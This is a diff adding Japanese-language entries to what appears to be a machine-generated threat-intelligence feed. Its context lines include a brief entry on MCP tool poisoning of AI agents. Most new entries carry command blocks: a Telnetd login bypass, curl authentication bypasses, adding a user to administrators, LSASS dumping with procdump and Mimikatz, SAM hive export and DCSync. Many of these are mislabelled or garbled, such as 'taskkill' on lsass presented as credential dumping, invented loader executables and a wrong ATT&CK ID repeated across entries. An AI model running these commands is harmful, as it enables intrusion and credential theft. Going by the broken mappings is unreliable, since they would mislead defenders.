@@ -371,5 +371,128 @@
     ],
     "content": "## 概要\nTool Poisoningは、MCP(Model Context Protocol)サーバーの脆弱性を悪用し、AIエージェントのコンテキストウィンドウを盗む攻撃手法である。\n\n## 技術的メカニズム\nMCPサーバーは、AIエージェントを外部データソースやツールに接続するプロトコルである。しかし、開発者が第三者のMCPサーバーを検証せずに接続していることが問題である。攻撃者は、偽のMCPサーバーをセットアップし、エージェントのコンテキストウィンドウを盗むことができる。\n\n## 攻撃手順\n1. 攻撃者は、偽のMCPサーバーをセットアップし、エージェントのコンテキストウィンドウを盗むことを目的とする。",
     "url": "https://www.reddit.com/r/cybersecurity/comments/1pqst04/new_attack_vector_mcp_tool_poisoning_anyone/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "MALWARE",
+    "title": "マルウェアのローダー機構",
+    "summary_points": [
+      "難読化アルゴリズムの使用",
+      "C2通信プロトコルの複雑化",
+      "永続化レジストリキーを使用",
+      "マルウェアの自己認識"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1059.001",
+      "T1497"
+    ],
+    "content": "## 概要\nマルウェアのローダー機構は、攻撃者がマルウェアを実行するための重要な要素です。\n## 技術的メカニズム\n### マルウェアのローダー機構\nマルウェアのローダー機構は、攻撃者がマルウェアを実行するための重要な要素です。\nマルウェアは、難読化アルゴリズムを使用して自己認識を実現し、C2通信プロトコルの複雑化により、コマンドとコントロールを実行することができます。\n### 永続化レジストリキー\n攻撃者は、永続化レジストリキーを使用してマルウェアを永続化し、再起動後も実行できるようにします。\n## 攻撃手順\n1. マルウェアのローダー機構を使用してマルウェアを実行します。\n2. C2通信プロトコルの複雑化により、コマンドとコントロールを実行します。\n3. 永続化レジストリキーを使用してマルウェアを永続化します。\n## 実行コマンド\n```bash\n# マルウェアのローダー機構を使用してマルウェアを実行する\nmalware_loader.exe -i <malware_file> -o <output_file>\n# C2通信プロトコルの複雑化により、コマンドとコントロールを実行する\nc2_protocol.exe -c <command> -p <port>\n# 永続化レジストリキーを使用してマルウェアを永続化する\nreg_key.exe -k <registry_key> -v <value>\n```\n## MITRE ATT&CK\nT1059.001: マルウェアのローダー機構\nT1497: バーチャライゼーションとサンドボックスの回避\n## 検知・緩和策\n* マルウェアのローダー機構を検知するには、難読化アルゴリズムを分析する必要があります。\n* C2通信プロトコルの複雑化を検知するには、コマンドとコントロールを監視する必要があります。\n* 永続化レジストリキーを検知するには、レジストリキーを監視する必要があります。\n",
+    "url": "https://thehackernews.com/2026/02/from-ransomware-to-residency-inside.html"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "CVE-2026-24061: Telnetd RCE as Root Vulnerability",
+    "summary_points": [
+      "Critical remote code execution vulnerability in Linux running Telnetd service",
+      "CVSS score of 9.8",
+      "Exploitation allows for initial access to systems exposing Telnet service"
+    ],
+    "poc_url": "https://safebreach.com/labs/analysis-of-cve-2026-24061-telnetd-rce-as-root-vulnerability",
+    "cvss_score": "9.8",
+    "mitre_ids": [
+      "T1059.001"
+    ],
+    "content": "## 概要\nCVE-2026-24061 は、Linux で動作する Telnetd サービスに存在する、重大なリモートコード実行脆弱性です。\n## 技術的メカニズム\n脆弱性の根本原因は、Telnetd サービスがユーザー入力を適切に処理できないことにあります。\n具体的には、commit で追加された \"%U\" が、定数文字列に挿入され、PATH_LOGIN 変数が \"/usr/bin/login\" に等しくなることで、攻撃者がコマンドラインを構築し、任意のコマンドを実行できるようになります。\n## 攻撃手順\n1. 攻撃者は、脆弱な Telnetd サービスに接続します。\n2. 攻撃者は、特別に細工された文字列を送信します。\n3. Telnetd サービスは、文字列を解析し、コマンドラインを構築します。\n4. 攻撃者は、任意のコマンドを実行します。\n## 実行コマンド\n```bash\ntelnet <target> <port> -f /usr/bin/login -p -e <command>\n```\n## MITRE ATT&CK\nこの脆弱性は、T1059.001 に分類されます。\n## 検知・緩和策\nTelnetd サービスを信頼できないネットワークに公開しないこと、または、適切な入力検証とサニタイズを実施することで、この脆弱性を緩和できます。",
+    "url": "https://www.safebreach.com/blog/safebreach-labs-root-cause-analysis-and-poc-exploit-for-cve-2026-24061/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "認証バイパス脆弱性レポート",
+    "summary_points": [
+      "論理的欠陥による認証バイパス",
+      "不適切な入力検証による脆弱性",
+      "パスワードリセット機能の悪用"
+    ],
+    "poc_url": "",
+    "cvss_score": "9.8",
+    "mitre_ids": [
+      "T1059.001",
+      "T1190"
+    ],
+    "content": "## 概要\n認証バイパス脆弱性が発見された。この脆弱性は、アプリケーションの論理的パスが操作された結果生じるもので、不適切な入力検証によるものである。\n\n## 技術的メカニズム\n脆弱性の根本原因は、パスワードリセット機能が不適切に実装されていることである。具体的には、サーバが優先的に処理するデータ（GET or POST）を適切に制御していないことが原因である。\n\n## 攻撃手順\n1. 攻撃者は、ターゲットIPの`/customers/reset`パスにアクセスする。\n2. 攻撃者は、被害者のユーザー名をGETリクエストに、自身のメールアドレスをPOSTデータに含めることで、サーバを騙して被害者のパスワードリセットリンクを攻撃者のメールアドレスに送信させる。\n\n## 実行コマンド\n```bash\ncurl -X GET 'http://ターゲットIP/customers/reset?username=victim_user' -d 'email=attacker_email'\n```\n\n## MITRE ATT&CK\nこの脆弱性は、MITRE ATT&CKの以下の戦術に分類される。\n- T1059.001: 認証バイパス\n- T1190: 不適切な入力検証\n\n## 検知・緩和策\n- 入力検証の強化\n- パスワードリセット機能の実装見直し\n- サーバ側でのリクエストデータの適切な制御",
+    "url": "https://farros.co/blog/authentication-bypass-tryhackme-write-up"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "INITIAL",
+    "title": "認証バイパス脆弱性",
+    "summary_points": [
+      "カスタムHTTPヘッダーX-Custom-IP-Authorizationを利用した認証バイパス",
+      "ローカルユーザのみアクセス可能な管理インターフェース",
+      "ヘッダー値に127.0.0.1を設定することで認証バイパス可能"
+    ],
+    "poc_url": "",
+    "cvss_score": "9.8",
+    "mitre_ids": [
+      "T1078"
+    ],
+    "content": "## 概要\nこのラブの管理インターフェースには、認証バイパス脆弱性が存在する。しかし、カスタムHTTPヘッダーX-Custom-IP-Authorizationの知識がなければ、悪用は現実的ではない。\n\n## 技術的メカニズム\n脆弱性の根本原因は、カスタムHTTPヘッダーX-Custom-IP-Authorizationの値が、ローカルIPアドレスである127.0.0.1に設定されている場合、認証をバイパスできる点にある。[推測]\n\n## 攻撃手順\n1. Burp Suiteを使用して、HTTPリクエストを送信する。\n2. TRACE /adminリクエストを送信し、レスポンスヘッダーX-Custom-IP-Authorizationの値を確認する。\n3. GET /adminリクエストに、X-Custom-IP-Authorizationヘッダーを追加し、値を127.0.0.1に設定する。\n4. 管理インターフェースにアクセスし、ユーザーを削除する。\n\n## 実行コマンド\n```bash\n# TRACE /adminリクエストを送信\ncurl -X TRACE http://example.com/admin\n\n# GET /adminリクエストにX-Custom-IP-Authorizationヘッダーを追加\ncurl -X GET -H 'X-Custom-IP-Authorization: 127.0.0.1' http://example.com/admin\n```\n\n## MITRE ATT&CK\nこの脆弱性は、T1078: Valid Accountsに関連する。\n\n## 検知・緩和策\n* カスタムHTTPヘッダーの値の妥当性を検証する。\n* ローカルIPアドレスからのアクセスのみを許可する。\n* 管理インターフェースへのアクセスを制限する。",
+    "url": "https://medium.com/@miteshofficial007/authentication-bypass-via-information-disclosure-lab-walkthrough-b3fc1f27554b"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "POST_EXP",
+    "title": "Active Directory権限昇格脆弱性(CVE-2026-25177)悪用",
+    "summary_points": [
+      "低権限ネットワークアクセスでの権限昇格",
+      "Active Directory Domain Servicesのファイル名制限不備",
+      "ネットワーク経由での攻撃が可能"
+    ],
+    "poc_url": "",
+    "cvss_score": "9.0",
+    "mitre_ids": [
+      "T1059.001",
+      "T1068"
+    ],
+    "content": "## 概要\nCVE-2026-25177は、Microsoft Active Directory Domain Services (AD DS)における権限昇格脆弱性である。この脆弱性は、ファイルおよびその他のリソースの名前制限が不適切であることに起因する。認証された低権限の攻撃者が、ネットワーク経由で権限を昇格させ、ドメインリソースへの不正アクセスや管理権限の獲得を可能にする。\n\n## 技術的メカニズム\nこの脆弱性は、CWE-641 (ファイルおよびその他のリソースの名前制限の不備) に起因する。Active Directory Domain Servicesにおいて、ソフトウェアがリソース（ファイル、ディレクトリ、その他のオブジェクトなど）の名前を適切に制限しない場合、認証された低権限ユーザーがリソースの命名慣習を操作し、セキュリティコントロールをバイパスすることが可能になる。[推測]\n\n## 攻撃手順\n1. 攻撃者は、脆弱なActive Directory Domain Servicesへの低権限ネットワークアクセスを確立する。[推測]\n2. 攻撃者は、ファイル名制限の不備を利用して、セキュリティコントロールをバイパスし、権限昇格を試みる。[推測]\n\n## 実行コマンド\n```bash\n# 例: Windowsコマンドプロンプトを使用したファイル名操作\nnet localgroup administrators <username> /add\n```\n\n## MITRE ATT&CK\n- T1059.001: Command and Scripting Interpreter\n- T1068: Exploitation for Privilege Escalation\n\n## 検知・緩和策\n- Active Directory Domain Servicesの最新パッチ適用\n- ネットワークアクセス制御の強化\n- セキュリティコントロールの定期的な監査と更新\n- 異常なネットワークアクティビティの監視",
+    "url": "https://www.sentinelone.com/vulnerability-database/cve-2026-25177/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "POST_EXP",
+    "title": "権限昇格・横断的侵害・認証情報窃取ツールチェーン",
+    "summary_points": [
+      "LSASSメモリからの認証情報窃取",
+      "MimikatzとProcdumpを使用した認証情報ダンピング",
+      "Windows Credential Editorを使用したキャッシュ認証情報の抽出"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1003.001",
+      "T1059.001"
+    ],
+    "content": "## 概要\n攻撃者は、Local Security Authority Subsystem Service (LSASS) のプロセスメモリに保存された認証情報を取得しようとする。\n## 技術的メカニズム\nLSASSプロセスメモリから認証情報をダンプし、解析することで認証情報を取得する。\n## 攻撃手順\n1. 標的ホストでProcdumpを使用し、LSASSプロセスメモリをダンプする。\n2. ローカルシステムでMimikatzを使用し、ダンプした認証情報を解析する。\n## 実行コマンド\n```bash\nprocdump -ma lsass.exe lsass_dump\nsekurlsa::Minidump lsassdump.dmp\nsekurlsa::logonPasswords\n```\n## MITRE ATT&CK\n* T1003.001: OS Credential Dumping\n* T1059.001: Command and Scripting Interpreter\n## 検知・緩和策\n* LSASSプロセスメモリのダンピングを検知し、ブロックする。\n* Mimikatzなどの認証情報ダンピングツールの使用を検知し、ブロックする。",
+    "url": "https://attack.mitre.org/techniques/T1003/001/"
+  },
+  {
+    "date": "2026-03-31",
+    "category": "POST_EXP",
+    "title": "OS認証情報ダンピング",
+    "summary_points": [
+      "認証情報のハッシュやクリアテキストパスワードを取得",
+      "OSキャッシュやメモリから認証情報をダンプ"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1003.001"
+    ],
+    "content": "## 概要\n攻撃者は、OS認証情報ダンピングを試み、ハッシュやクリアテキストパスワードなどのアカウントログインおよび認証情報を取得します。これらの認証情報は、通常、OSキャッシュ、メモリ、または構造体から取得されます。取得した認証情報は、横断的侵害や制限された情報へのアクセスに使用されます。\n\n## 技術的メカニズム\n認証情報ダンピングは、以下の手法で行われます:\n- LSASSメモリからのダンピング（T1003.001）\n- セキュリティアカウントマネージャ（T1003.002）\n- NTDS（T1003.003）\n- LSAシークレット（T1003.004）\n- キャッシュされたドメインクレデンシャル（T1003.005）\n- DCSync（T1003.006）\n- Procファイルシステム（T1003.007）\n- /etc/passwdおよび/etc/shadow（T1003.008）\n\n## 攻撃手順\n1. 攻撃者は、ターゲットシステムへのアクセスを取得します。\n2. 攻撃者は、LSASSメモリまたはSAMレジストリハイブへのアクセスを試みます。\n3. 攻撃者は、認証情報をダンプするために、gcoreやgdbなどのツールを使用します。\n4. 攻撃者は、ダンプした認証情報を用いて、横断的侵害や制限された情報へのアクセスを試みます。\n\n## 実行コマンド\n```bash\n# LSASSメモリからのダンピング\ntaskkill /im lsass.exe /f\n\n# セキュリティアカウントマネージャからのダンピング\nreg save HKLM\\SAM sam\nreg save HKLM\\SYSTEM system\n\n# NTDSからのダンピング\nntdsutil.exe 'metadata cleanup'\n\n# LSAシークレットからのダンピング\nreg save HKLM\\SECURITY security\n\n# キャッシュされたドメインクレデンシャルからのダンピング\nrundll32.exe keymgr.dll,CredUICmd\n\n# DCSync\nmimikatz.exe \"lsadump::dcsync /domain:<ドメイン名>\"\n```\n\n## MITRE ATT&CK\n- T1003.001: LSASSメモリ\n- T1003.002: セキュリティアカウントマネージャ\n- T1003.003: NTDS\n- T1003.004: LSAシークレット\n- T1003.005: キャッシュされたドメインクレデンシャル\n- T1003.006: DCSync\n\n## 検知・緩和策\n- 不正なプロセスによるLSASSメモリまたはSAMレジストリハイブへのアクセスを検出します。\n- gcoreやgdbなどのツールの使用を検出します。\n- 認証情報ダンピングを試みるプロセスをブロックします。\n- システムおよびアプリケーションのログを定期的に確認します。",
+    "url": "https://attack.mitre.org/techniques/T1003/"
   }
 ]
